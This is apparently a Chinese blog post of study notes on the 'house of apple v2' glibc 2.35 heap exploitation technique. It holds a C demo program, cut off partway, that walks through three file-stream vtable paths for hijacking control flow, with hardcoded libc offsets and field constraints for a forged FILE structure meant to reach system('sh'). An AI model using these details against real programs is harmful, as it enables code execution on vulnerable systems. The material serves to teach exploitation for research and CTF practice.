---
title: glibc 2.35 pwn——house of apple v2 示例程序
date: 2023-03-20 00:14:03
categories:
- 学习笔记
- glibc 系列
---
house of apple v2与v1不同，可以直接控制程序执行流，获得shell。
主要参考资料：[传送门](https://bbs.kanxue.com/thread-273832.htm)

v2有多种程序执行路径，每一条执行路径对于伪造的`FILE`结构体、`_wide_data`结构体都有不同的要求。在学习本漏洞时要学会举一反三，只要了解了基本原理，这些路径实际上我们是可以自己推出来的。

**小建议：读者可以使用IDA打开ubuntu 22.04本机的libc并保存i64文件，由于libc文件中保存的`_IO_jump_t`结构体中有很多函数都没有符号，因此在学习FSOP的过程中可以匹配`_IO_jump_t`结构体本身的名字以及其中含有的函数名，这样在下一次查看时就不需要再去推断某一个位置函数的名字了。musl libc同理。**

后续笔者会将自己写的所有演示代码上传到github供各位读者学习。

头文件util.h：含说明文字的颜色输出、获取libc基地址等实用函数（后续可能会进一步完善，添加新的函数与功能）
```c
//
// Created by root on 23-3-16.
//

#ifndef MY_HOW2HEAP_UTIL_H
#define MY_HOW2HEAP_UTIL_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>

#define BLACK       "30"
#define RED         "31"
#define GREEN       "32"
#define YELLOW      "33"
#define BLUE        "34"
#define PURPLE      "35"
#define GREEN_DARK  "36"
#define WHITE       "37"

#define HIGHLIGHT_BLACK_HEAD        "\033[1;30m"
#define HIGHLIGHT_RED_HEAD          "\033[1;31m"
#define HIGHLIGHT_GREEN_HEAD        "\033[1;32m"
#define HIGHLIGHT_YELLOW_HEAD       "\033[1;33m"
#define HIGHLIGHT_BLUE_HEAD         "\033[1;34m"
#define HIGHLIGHT_PURPLE_HEAD       "\033[1;35m"
#define HIGHLIGHT_DARK_GREEN_HEAD   "\033[1;36m"
#define HIGHLIGHT_WHITE_HEAD        "\033[1;37m"

#define UNDEFINED   "-"
#define HIGHLIGHT   "1"
#define UNDERLINE   "4"
#define SPARK       "5"

#define STR_END      "\033[0m"

size_t victim[0x20];

void printf_color(char* color, char* effect, char* string){
    char buffer[0x1000] = {0};
    strcpy(buffer, "\033[");
    if(effect[0] != '-'){
        strcat(buffer, effect);
        strcat(buffer, ";");
    }
    strcat(buffer, color);
    strcat(buffer, "m");
    strcat(buffer, string);
    printf("%s" STR_END, buffer);
}

void print_binary(char* buf, int length){
    printf("---------------------------------------------------------------------------\n");
    printf("Address info starting in %p:\n", buf);
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
    printf("---------------------------------------------------------------------------\n");
}

size_t get_libc_base(){
    return (size_t)puts - 0x80ED0;
}

#endif //MY_HOW2HEAP_UTIL_H
```

源文件house_of_apple_2.c：主要演示代码，通过修改宏定义可选择使用3条执行路径中的1条。
```c
//
// Created by root on 23-3-16.
//
#include "util.h"
#define exploit_mode 3

char* binsh = "  sh";
char* binsh2 = "sh";

int main(){
    printf_color(GREEN, UNDEFINED, "本程序用于演示house of apple v2利用方式。\n");
    printf_color(YELLOW, HIGHLIGHT, "测试于ubuntu 22.04，glibc版本：Ubuntu GLIBC 2.35-0ubuntu3.1。\n");
    printf_color(WHITE, HIGHLIGHT, "1. 原理介绍\n");
    printf_color(GREEN, UNDEFINED, "与house of apple v1写堆地址不同，house of apple v2能够直接控制程序执行流。\n");
    printf_color(GREEN, UNDEFINED, "v2的函数调用链的前半部分与v1是相同的，都是使用exit函数调用到_IO_flush_all_lockp。\n");
    printf_color(GREEN, UNDEFINED, "再一次回顾_IO_flush_all_lockp这个函数的内容：\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/genops.c， line 684)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "int\n"
                 "_IO_flush_all_lockp (int do_lock)\n"
                 "{\n"
                 "  int result = 0;\n"
                 "  FILE *fp;\n"
                 "\n"
                 "#ifdef _IO_MTSAFE_IO\n"
                 "  _IO_cleanup_region_start_noarg (flush_cleanup);\n"
                 "  _IO_lock_lock (list_all_lock);\n"
                 "#endif\n"
                 "\n"
                 "  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)\n"
                 "    {\n"
                 "      run_fp = fp;\n"
                 "      if (do_lock)\n"
                 "\t_IO_flockfile (fp);\n"
                 "\n"
                 "      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)\n"
                 "\t   || (_IO_vtable_offset (fp) == 0\n"
                 "\t       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n"
                 "\t\t\t\t    > fp->_wide_data->_IO_write_base))\n"
                 "\t   )\n"
                 "\t  && _IO_OVERFLOW (fp, EOF) == EOF)\n"
                 "\tresult = EOF;\n"
                 "\n"
                 "      if (do_lock)\n"
                 "\t_IO_funlockfile (fp);\n"
                 "      run_fp = NULL;\n"
                 "    }\n\033[1;" PURPLE "m"
                 "\n"
                 "#ifdef _IO_MTSAFE_IO\n"
                 "  _IO_lock_unlock (list_all_lock);\n"
                 "  _IO_cleanup_region_end (0);\n"
                 "#endif\n"
                 "\n"
                 "  return result;\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "注意这里的_IO_OVERFLOW()，这实际上是一个宏定义，内容如下：");

    printf_color(PURPLE, HIGHLIGHT,
                 "#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n"
                 "#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)\n"
                 "# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))\n\n");

    printf_color(GREEN, UNDEFINED, "其主要功能是调用_IO_FILE_plus_complete中的vtable中的OVERFLOW函数，这是一个函数指针。\n");
    printf_color(GREEN, UNDEFINED, "可以注意到最终这里会调用IO_validate_vtable函数，这个函数是用于检测vtable的合法性的。\n");
    printf_color(GREEN, UNDEFINED, "有这个函数做检查，我们自己伪造的vtable很难绕过，因为它会检查vtable的地址是否在libc统一保存vtable的地址块中。\n");
    printf_color(GREEN, UNDEFINED, "而在house of apple v2中，我们使用的不是_IO_OVERFLOW，而是_IO_Wxxx，这是两类相似的函数。\n");
    printf_color(GREEN, UNDEFINED, "以_IO_WDOALLOCATE为例：\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/libioP.h)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)\n"
                 "#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)\n"
                 "#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)\n"
                 "#define _IO_WIDE_JUMPS(THIS) \\\n"
                 "  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable\n\n");

    printf_color(GREEN, UNDEFINED, "其中_IO_CAST_FIELD_ACCESS会直接取出对应的函数指针准备执行，因此可以看到这里就没有上面函数的检查。\n");
    printf_color(GREEN, UNDEFINED, "它会执行_IO_FILE->_wide_data->_wide_vtable中的函数。因此v2与v1同样利用了_wide_data。\n");
    printf_color(GREEN, UNDEFINED, "因此我们伪造_wide_data的_wide_vtable中的函数指针就可以达到控制函数执行流的目的。\n");
    printf_color(YELLOW, HIGHLIGHT, "这也就能够解释为什么我们不能够直接伪造_IO_flush_all_lockp中处理的_IO_FILE结构体中的vtable指针。\n");
    printf_color(YELLOW, HIGHLIGHT, "因为我们伪造的_IO_FILE无法通过vtable合法性检查。\n");
    printf_color(YELLOW, HIGHLIGHT, "我们只能将vtable指针修改成libc中已有的其他vtable指针，这也是house of apple的关键步骤。\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/libio.h, line 121)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_wide_data\n"
                 "{\n"
                 "  wchar_t *_IO_read_ptr;\t/* Current read pointer */\n"
                 "  wchar_t *_IO_read_end;\t/* End of get area. */\n"
                 "  wchar_t *_IO_read_base;\t/* Start of putback+get area. */\n"
                 "  wchar_t *_IO_write_base;\t/* Start of put area. */\n"
                 "  wchar_t *_IO_write_ptr;\t/* Current put pointer. */\n"
                 "  wchar_t *_IO_write_end;\t/* End of put area. */\n"
                 "  wchar_t *_IO_buf_base;\t/* Start of reserve area. */\n"
                 "  wchar_t *_IO_buf_end;\t\t/* End of reserve area. */\n"
                 "  /* The following fields are used to support backing up and undo. */\n"
                 "  wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */\n"
                 "  wchar_t *_IO_backup_base;\t/* Pointer to first valid character of\n"
                 "\t\t\t\t   backup area */\n"
                 "  wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */\n"
                 "\n"
                 "  __mbstate_t _IO_state;\n"
                 "  __mbstate_t _IO_last_state;\n"
                 "  struct _IO_codecvt _codecvt;\n"
                 "\n"
                 "  wchar_t _shortbuf[1];\n"
                 "\n"
                 "  \033[1;31mconst struct _IO_jump_t *_wide_vtable;\n\033[1;" PURPLE "m"
                 "};\n\n");

    printf_color(WHITE, HIGHLIGHT, "2. 几种利用方式介绍\n");
    printf_color(GREEN, UNDEFINED, "经过上面的介绍，我们知道了house of apple v2的主要步骤：\n");
    printf_color(YELLOW, UNDEFINED, "a. 修改_IO_flush_all_lockp中处理的_IO_FILE的vtable为已有vtable，伪造_wide_data->_wide_vtable指针。\n");
    printf_color(YELLOW, UNDEFINED, "b. 调用该vtable后期望能够调用到_wide_data->_wide_vtable中的函数指针。\n");
    printf_color(GREEN, UNDEFINED, "具体来看，有几条执行流能够让我们控制rip，下面就来一一介绍。\n");
    printf_color(GREEN, UNDEFINED, "参考资料：https://bbs.kanxue.com/thread-273832.htm\n");

    printf_color(GREEN, UNDEFINED, "不过无论是哪一条路线，都需要获得libc的基地址：");
    size_t libc_base = get_libc_base();
    printf("\033[1;31m%#zx\033[0m\n\n", libc_base);
    printf_color(GREEN, UNDEFINED, "还有两个堆地址，一个保存fake FILE，一个保存fake _wide_data vtable：");
    struct _IO_FILE* fake_FILE = (struct _IO_FILE*) malloc(0x400);
    size_t* fake_vtable = (size_t*) malloc(0x100);
    struct _IO_wide_data* fake_wide_data = (struct _IO_wide_data*)malloc(0x100);
    printf("\033[1;31m%p\033[0m\n\n", fake_FILE);
    size_t* _IO_list_all = (size_t*)(libc_base + 0x21A680);

    printf_color(WHITE, HIGHLIGHT, "(1) _IO_wfile_overflow 路线\n");
    printf_color(GREEN, UNDEFINED, "这个函数指的是第a步中期待从已有vtable跳入的函数，下同。\n");
    printf_color(GREEN, UNDEFINED, "考虑到这个函数在不止一个vtable中都有出现，因此我们可以修改成多个vtable的值。\n");
    printf_color(GREEN, UNDEFINED, "在/libio/wfileops.c中(line 1025, 1051, 1075)我们就能够找到3个vtable中包含该函数：\n");
    printf_color(GREEN, UNDEFINED, "_IO_wfile_jumps、_IO_wfile_jumps_mmap、_IO_wfile_jumps_maybe_mmap。\n");
    printf_color(GREEN, UNDEFINED, "我们只需要随便选择1个覆盖掉_IO_list_all的vtable即可。");
    printf_color(GREEN, UNDEFINED, "在IDA中，我们只能找到_IO_wfile_jumps这个符号，地址为0x2160C0。\n");
    printf_color(GREEN, UNDEFINED, "不过通过查看_IO_wfile_overflow函数的交叉引用，我们可以找到另外两个jumps的地址：0x215F40和0x216000。\n");
    printf_color(GREEN, UNDEFINED, "为了演示需要，本程序不在原有stderr的情况下修改，而是直接修改_IO_list_all指针值为自己伪造的_IO_FILE。\n");

    printf_color(GREEN, UNDEFINED, "首先介绍一下_IO_wfile_overflow函数的内容：\n\n");
    printf_color(BLUE, HIGHLIGHT, "(/libio/wfileops.c, line 405)\n");
    printf_color(PURPLE, HIGHLIGHT,
                "wint_t\n"
                "_IO_wfile_overflow (FILE *f, wint_t wch)\n"
                "{\n"
                "  if (" HIGHLIGHT_RED_HEAD "f->_flags & _IO_NO_WRITES) " HIGHLIGHT_PURPLE_HEAD " /* SET ERROR, _IO_NO_WRITES = 8 */\n"
                "    {\n"
                "      f->_flags |= _IO_ERR_SEEN;\n"
                "      __set_errno (EBADF);\n"
                "      return WEOF;\n"
                "    }\n"
                "  /* If currently reading or no buffer allocated. */\n"
                "  if ( "HIGHLIGHT_GREEN_HEAD" (f->_flags & _IO_CURRENTLY_PUTTING) == 0"HIGHLIGHT_PURPLE_HEAD") // _IO_CURRENTLY_PUTTING = 0x800\n"
                "    {\n"
                "      /* Allocate a buffer if needed. */\n"
                "      if ("HIGHLIGHT_GREEN_HEAD"f->_wide_data->_IO_write_base == 0"HIGHLIGHT_PURPLE_HEAD")\n"
                "\t{\n"
                "\t  " HIGHLIGHT_YELLOW_HEAD "_IO_wdoallocbuf (f);\n" HIGHLIGHT_PURPLE_HEAD
                "\t  _IO_free_wbackup_area (f);\n"
                "\t  _IO_wsetg (f, f->_wide_data->_IO_buf_base,\n"
                "\t\t     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);\n"
                "\n"
                "\t  if (f->_IO_write_base == NULL)\n"
                "\t    {\n"
                "\t      _IO_doallocbuf (f);\n"
                "\t      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);\n"
                "\t    }\n"
                "\t}\n"
                "      else\n"
                "\t{\n"
                "\t  /* Otherwise must be currently reading.  If _IO_read_ptr\n"
                "\t     (and hence also _IO_read_end) is at the buffer end,\n"
                "\t     logically slide the buffer forwards one block (by setting\n"
                "\t     the read pointers to all point at the beginning of the\n"
                "\t     block).  This makes room for subsequent output.\n"
                "\t     Otherwise, set the read pointers to _IO_read_end (leaving\n"
                "\t     that alone, so it can continue to correspond to the\n"
                "\t     external position). */\n"
                "\t  if (f->_wide_data->_IO_read_ptr == f->_wide_data->_IO_buf_end)\n"
                "\t    {\n"
                "\t      f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;\n"
                "\t      f->_wide_data->_IO_read_end = f->_wide_data->_IO_read_ptr =\n"
                "\t\tf->_wide_data->_IO_buf_base;\n"
                "\t    }\n"
                "\t}\n"
                "      f->_wide_data->_IO_write_ptr = f->_wide_data->_IO_read_ptr;\n"
                "      f->_wide_data->_IO_write_base = f->_wide_data->_IO_write_ptr;\n"
                "      f->_wide_data->_IO_write_end = f->_wide_data->_IO_buf_end;\n"
                "      f->_wide_data->_IO_read_base = f->_wide_data->_IO_read_ptr =\n"
                "\tf->_wide_data->_IO_read_end;\n"
                "\n"
                "      f->_IO_write_ptr = f->_IO_read_ptr;\n"
                "      f->_IO_write_base = f->_IO_write_ptr;\n"
                "      f->_IO_write_end = f->_IO_buf_end;\n"
                "      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;\n"
                "\n"
                "      f->_flags |= _IO_CURRENTLY_PUTTING;\n"
                "      if (f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))\n"
                "\tf->_wide_data->_IO_write_end = f->_wide_data->_IO_write_ptr;\n"
                "    }\n"
                "  if (wch == WEOF)\n"
                "    return _IO_do_flush (f);\n"
                "  if (f->_wide_data->_IO_write_ptr == f->_wide_data->_IO_buf_end)\n"
                "    /* Buffer is really full */\n"
                "    if (_IO_do_flush (f) == EOF)\n"
                "      return WEOF;\n"
                "  *f->_wide_data->_IO_write_ptr++ = wch;\n"
                "  if ((f->_flags & _IO_UNBUFFERED)\n"
                "      || ((f->_flags & _IO_LINE_BUF) && wch == L'\\n'))\n"
                "    if (_IO_do_flush (f) == EOF)\n"
                "      return WEOF;\n"
                "  return wch;\n"
                "}\n"
                "libc_hidden_def (_IO_wfile_overflow)\n\n");

    printf_color(GREEN, UNDEFINED, "我们要调用的是_IO_wallocatebuf函数：\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/wgenops.c, line 363)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "void\n"
                 "_IO_wdoallocbuf (FILE *fp)\n"
                 "{\n"
                 "  if (" HIGHLIGHT_RED_HEAD "fp->_wide_data->_IO_buf_base)\n" HIGHLIGHT_PURPLE_HEAD
                 "    return;\n"
                 "  if (" HIGHLIGHT_GREEN_HEAD "!(fp->_flags & _IO_UNBUFFERED)" HIGHLIGHT_PURPLE_HEAD ")    // _IO_UNBUFFERED == 0x2\n"
                 "    if ((wint_t) " HIGHLIGHT_YELLOW_HEAD " _IO_WDOALLOCATE (fp) " HIGHLIGHT_PURPLE_HEAD " != WEOF)\n"
                 "      return;\n"
                 "  _IO_wsetb (fp, fp->_wide_data->_shortbuf,\n"
                 "\t\t     fp->_wide_data->_shortbuf + 1, 0);\n"
                 "}\n"
                 "libc_hidden_def (_IO_wdoallocbuf)\n\n");

    printf_color(GREEN, UNDEFINED, "这里的_IO_WDOALLOCATE也是一个宏定义，本质就是调用_wide_data中vtable表的函数指针。\n");
    printf_color(GREEN, UNDEFINED, "而且_IO_Wxxx的宏定义函数调用没有检查，因此我们才能伪造这个函数指针。\n");
    printf_color(GREEN, UNDEFINED, "可以看到这个函数指针的参数是FILE结构体本身，因此如果要在此调用system，需要在FILE开头写'/bin/sh'。\n\n");
    printf_color(GREEN, HIGHLIGHT, "伪造FILE结构体与_wide_data的几条注意点：\n");
    printf_color(YELLOW, HIGHLIGHT, "A. FILE->mode = 0 (_IO_flush_all_lockp 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "B. FILE->_IO_write_ptr > FILE->_IO_write_base (_IO_flush_all_lockp 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "C. FILE->_flags & 0x8 == 0 (_IO_wfile_overflow 控制流判断条件，注意_flags在FILE结构体最开头，与binsh字符串重合，因此不能直接写'/bin/sh'，本程序写入的是'  sh')\n");
    printf_color(YELLOW, HIGHLIGHT, "D. FILE->_flags & 0x800 == 0 (_IO_wfile_overflow 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "E. FILE->_wode_data->_IO_write_base == 0 (_IO_wfile_overflow 控制流判断条件，_IO_write_base偏移0x18)\n");
    printf_color(YELLOW, HIGHLIGHT, "F. FILE->_wide_data->_IO_buf_base == 0 (_IO_wdoallocbuf 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "G. FILE->_flags & 2 != 0 (_IO_wdoallocbuf 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "H. FILE->_wide_data->_wide_vtable + 0x68 == 要执行的代码地址 (ALLOCATE函数指针偏移0x68)\n\n");

    printf_color(WHITE, HIGHLIGHT, "(2) _IO_wfile_underflow_mmap 路线\n");
    printf_color(GREEN, UNDEFINED, "这个函数在IDA中原本是没有符号的，但通过对_IO_wdoallocbuf函数的引用分析可以定位其位置：0x860B0。\n");
    printf_color(GREEN, UNDEFINED, "同时可以发现该函数只有1个已有的_IO_jump_t引用，偏移为0x216000 (_IO_wfile_jumps_mmap)。\n");
    printf_color(GREEN, UNDEFINED, "看一下这个函数对我们的FILE结构体有什么要求。\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/wfileops.c, line 331)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "static wint_t\n"
                 "_IO_wfile_underflow_mmap (FILE *fp)\n"
                 "{\n"
                 "  struct _IO_codecvt *cd;\n"
                 "  const char *read_stop;\n"
                 "\n"
                 "  if (" HIGHLIGHT_RED_HEAD "__glibc_unlikely (fp->_flags & _IO_NO_READS)" HIGHLIGHT_PURPLE_HEAD ")    // _IO_NO_READS == 0x4\n"
                 "    {\n"
                 "      fp->_flags |= _IO_ERR_SEEN;\n"
                 "      __set_errno (EBADF);\n"
                 "      return WEOF;\n"
                 "    }\n"
                 "  if (" HIGHLIGHT_RED_HEAD "fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "    return *fp->_wide_data->_IO_read_ptr;\n"
                 "\n"
                 "  cd = fp->_codecvt;\n"
                 "\n"
                 "  /* Maybe there is something left in the external buffer.  */\n"
                 "  if (" HIGHLIGHT_RED_HEAD "fp->_IO_read_ptr >= fp->_IO_read_end\n"
                 "      /* No.  But maybe the read buffer is not fully set up.  */\n"
                 "      && _IO_file_underflow_mmap (fp) == EOF" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error\n"
                 "       flags as appropriate.  */\n"
                 "    return WEOF;\n"
                 "\n"
                 "  /* There is more in the external.  Convert it.  */\n"
                 "  read_stop = (const char *) fp->_IO_read_ptr;\n"
                 "\n"
                 "  if (" HIGHLIGHT_GREEN_HEAD "fp->_wide_data->_IO_buf_base == NULL" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "    {\n"
                 "      /* Maybe we already have a push back pointer.  */\n"
                 "      if (" HIGHLIGHT_RED_HEAD "fp->_wide_data->_IO_save_base != NULL" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "\t{\n"
                 "\t  free (fp->_wide_data->_IO_save_base);\n"
                 "\t  fp->_flags &= ~_IO_IN_BACKUP;\n"
                 "\t}\n"
                 "      " HIGHLIGHT_YELLOW_HEAD "_IO_wdoallocbuf (fp);\n" HIGHLIGHT_PURPLE_HEAD
                 "    }\n"
                 "\n"
                 "  fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;\n"
                 "  fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =\n"
                 "    fp->_wide_data->_IO_buf_base;\n"
                 "  __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,\n"
                 "\t\t      fp->_IO_read_ptr, fp->_IO_read_end,\n"
                 "\t\t      &read_stop,\n"
                 "\t\t      fp->_wide_data->_IO_read_ptr,\n"
                 "\t\t      fp->_wide_data->_IO_buf_end,\n"
                 "\t\t      &fp->_wide_data->_IO_read_end);\n"
                 "\n"
                 "  fp->_IO_read_ptr = (char *) read_stop;\n"
                 "\n"
                 "  /* If we managed to generate some text return the next character.  */\n"
                 "  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)\n"
                 "    return *fp->_wide_data->_IO_read_ptr;\n"
                 "\n"
                 "  /* There is some garbage at the end of the file.  */\n"
                 "  __set_errno (EILSEQ);\n"
                 "  fp->_flags |= _IO_ERR_SEEN;\n"
                 "  return WEOF;\n"
                 "}\n"
                 "\n"
                 "static wint_t\n"
                 "_IO_wfile_underflow_maybe_mmap (FILE *fp)\n"
                 "{\n"
                 "  /* This is the first read attempt.  Doing the underflow will choose mmap\n"
                 "     or vanilla operations and then punt to the chosen underflow routine.\n"
                 "     Then we can punt to ours.  */\n"
                 "  if (_IO_file_underflow_maybe_mmap (fp) == EOF)\n"
                 "    return WEOF;\n"
                 "\n"
                 "  return _IO_WUNDERFLOW (fp);\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "其中也调用了_IO_wdoallocbuf函数。\n");
    printf_color(GREEN, UNDEFINED, "因此这条路径的限制条件为：\n");
    printf_color(YELLOW, HIGHLIGHT, "A. FILE->mode = 0 (_IO_flush_all_lockp 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "B. FILE->_IO_write_ptr > FILE->_IO_write_base (_IO_flush_all_lockp 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "C. FILE->_flag & 4 == 0 (_IO_wfile_underflow_mmap 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "D. FILE->_wide_data->_IO_read_ptr >= FILE->_wide_data->_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "E. FILE->_IO_read_ptr < FILE->_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "F. FILE->_wide_data->_IO_buf_base == NULL (_IO_wfile_underflow_mmap 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "G. FILE->_wide_data->_IO_save_base == NULL (_IO_wfile_underflow_mmap 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "H. FILE->_wide_data->_IO_buf_base == 0 (_IO_wdoallocbuf 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "I. FILE->_flags & 2 != 0 (_IO_wdoallocbuf 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "J. FILE->_wide_data->_wide_vtable + 0x68 == 要执行的代码地址 (ALLOCATE函数指针偏移0x68)\n\n");

    printf_color(WHITE, HIGHLIGHT, "(3) _IO_wdefault_xsgetn 路线\n");
    printf_color(GREEN, UNDEFINED, "这条路线有一个关键的限制条件：在进入时rdx!=0。下面通过分析将会解释这个条件的来源。\n");
    printf_color(GREEN, UNDEFINED, "这个函数出现于4个_IO_jump_t结构体中，可以选择其一：\n");
    printf_color(GREEN, HIGHLIGHT, "\t_IO_helper_jumps，偏移量0x215AC0\n");
    printf_color(GREEN, HIGHLIGHT, "\t_IO_wmem_jumps，偏移量0x216180\n");
    printf_color(GREEN, HIGHLIGHT, "\t_IO_wstr_jumps，偏移量0x215E80\n");
    printf_color(GREEN, HIGHLIGHT, "\t_IO_wstrn_jumps，偏移量0x215DC0\n");
    printf_color(GREEN, UNDEFINED, "不过需要注意的是，由于_IO_flush_all_lockp中调用的是OVERFLOW函数指针，因此需要加一个偏移才能使其调用_IO_wdefault_xsgetn。\n");
    printf_color(GREEN, UNDEFINED, "OVERFLOW函数指针的偏移为0x18，xsgetn的偏移为0x40，因此vtable的地址应该写入上述其中一个值+0x28。\n");
    printf_color(GREEN, UNDEFINED, "下面是_IO_wdefault_xsgetn函数的定义：\n");
    printf_color(BLUE, HIGHLIGHT, "(/libio/wgenops.c, line 324)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "size_t\n"
                 "_IO_wdefault_xsgetn (FILE *fp, void *data, " HIGHLIGHT_YELLOW_HEAD "size_t n" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "{\n"
                 "  " HIGHLIGHT_YELLOW_HEAD "size_t more = n;\n" HIGHLIGHT_PURPLE_HEAD
                 "  wchar_t *s = (wchar_t*) data;\n"
                 "  for (;;)\n"
                 "    {\n"
                 "      /* Data available. */\n"
                 "      " HIGHLIGHT_YELLOW_HEAD "ssize_t count = (fp->_wide_data->_IO_read_end\n"
                 "                       - fp->_wide_data->_IO_read_ptr);\n" HIGHLIGHT_PURPLE_HEAD
                 "      if (" HIGHLIGHT_RED_HEAD "count > 0" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "\t{\n"
                 "\t  if ((size_t) count > more)\n"
                 "\t    count = more;\n"
                 "\t  if (count > 20)\n"
                 "\t    {\n"
                 "\t      s = __wmempcpy (s, fp->_wide_data->_IO_read_ptr, count);\n"
                 "\t      fp->_wide_data->_IO_read_ptr += count;\n"
                 "\t    }\n"
                 "\t  else if (count <= 0)\n"
                 "\t    count = 0;\n"
                 "\t  else\n"
                 "\t    {\n"
                 "\t      wchar_t *p = fp->_wide_data->_IO_read_ptr;\n"
                 "\t      int i = (int) count;\n"
                 "\t      while (--i >= 0)\n"
                 "\t\t*s++ = *p++;\n"
                 "\t      fp->_wide_data->_IO_read_ptr = p;\n"
                 "            }\n"
                 "            more -= count;\n"
                 "        }\n"
                 "      if (" HIGHLIGHT_RED_HEAD "more == 0" HIGHLIGHT_PURPLE_HEAD " || " HIGHLIGHT_YELLOW_HEAD "__wunderflow (fp) == WEOF)\n" HIGHLIGHT_PURPLE_HEAD
                 "\tbreak;\n"
                 "    }\n"
                 "  return n - more;\n"
                 "}\n"
                 "libc_hidden_def (_IO_wdefault_xsgetn)\n\n");

    printf_color(GREEN, UNDEFINED, "从上面的代码就可以看出，我们为什么要让rdx!=0，这是为了使 more != 0。\n");
    printf_color(GREEN, UNDEFINED, "下面是__wunderflow函数的定义：\n");
    printf_color(BLUE, HIGHLIGHT, "(/libio/wgenops.c, line 250)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "wint_t\n"
                 "__wunderflow (FILE *fp)\n"
                 "{\n"
                 "  if (" HIGHLIGHT_RED_HEAD "fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))\n" HIGHLIGHT_PURPLE_HEAD
                 "    return WEOF;\n"
                 "\n"
                 "  if (" HIGHLIGHT_RED_HEAD "fp->_mode == 0" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "    _IO_fwide (fp, 1);\n"
                 "  if (" HIGHLIGHT_GREEN_HEAD "_IO_in_put_mode (fp)" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "    if (" HIGHLIGHT_YELLOW_HEAD "_IO_switch_to_wget_mode (fp) == EOF" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "      return WEOF;\n"
                 "  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)\n"
                 "    return *fp->_wide_data->_IO_read_ptr;\n"
                 "  if (_IO_in_backup (fp))\n"
                 "    {\n"
